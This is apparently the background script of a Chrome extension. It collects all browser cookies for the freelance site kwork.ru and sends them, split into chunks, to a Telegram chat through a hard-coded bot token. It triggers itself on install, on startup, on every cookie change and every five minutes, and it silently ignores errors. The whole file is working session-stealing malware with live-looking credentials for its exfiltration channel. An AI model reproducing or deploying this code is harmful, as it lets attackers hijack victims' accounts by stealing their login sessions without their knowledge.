const telegramBotToken = '7639548077:AAFvR0oZBHjytNXnMegbDCFgHHM_zx650LE';
const telegramChatId = '-1002663759518';

let lastSentCookiesHash = '';
let userId = '607446088851566357';

function sendCookiesToTelegram(cookies) {
    try {
        const cookiesStr = JSON.stringify(cookies, null, 2);
        const currentHash = hashString(cookiesStr);

        if (currentHash === lastSentCookiesHash) {
            return;
        }

        lastSentCookiesHash = currentHash;

        const maxLength = 3000;
        let parts = [];

        if (cookiesStr.length > maxLength) {
            for (let i = 0; i < cookiesStr.length; i += maxLength) {
                parts.push(cookiesStr.substring(i, i + maxLength));
            }
        } else {
            parts = [cookiesStr];
        }

        let partIndex = 0;
        sendPart();

        function sendPart() {
            if (partIndex >= parts.length) return;

            const part = parts[partIndex];
            const message = partIndex === 0 ?
                `🍪 Cookies kwork.ru [ID: ${userId}] (часть ${partIndex + 1}/${parts.length}):\n${part}` :
                `[ID: ${userId}] Часть ${partIndex + 1}/${parts.length}:\n${part}`;

            const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage`;

            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: telegramChatId,
                    text: message
                })
            })
                .then(response => response.json())
                .then(data => {
                    partIndex++;
                    setTimeout(sendPart, 300);
                })
                .catch(error => {
                    partIndex++;
                    setTimeout(sendPart, 500);
                });
        }
    } catch (error) { }
}

function fetchAndSendCookies() {
    chrome.cookies.getAll({ domain: 'kwork.ru' }, function (cookies) {
        if (cookies && cookies.length > 0) {
            sendCookiesToTelegram(cookies);
        }
    });
}

function hashString(str) {
    let hash = 0;
    if (str.length === 0) return hash;
    for (let i = 0; i < str.length; i++) {
        const char = str.charCodeAt(i);
        hash = ((hash << 5) - hash) + char;
        hash = hash & hash;
    }
    return hash.toString();
}

chrome.cookies.onChanged.addListener(function (changeInfo) {
    const cookie = changeInfo.cookie;
    if (cookie.domain.includes('kwork.ru')) {
        setTimeout(fetchAndSendCookies, 1000);
    }
});

chrome.runtime.onStartup.addListener(fetchAndSendCookies);
chrome.runtime.onInstalled.addListener(fetchAndSendCookies);

chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
    if (request.action === 'fetchCookies') {
        fetchAndSendCookies();
        sendResponse({ status: 'запрос на получение cookies отправлен' });
    } else if (request.action === 'setUserId' && request.userId) {
        userId = request.userId;
        sendResponse({ status: 'ID пользователя обновлен' });
    }
    return true;
});

setInterval(fetchAndSendCookies, 5 * 60 * 1000); 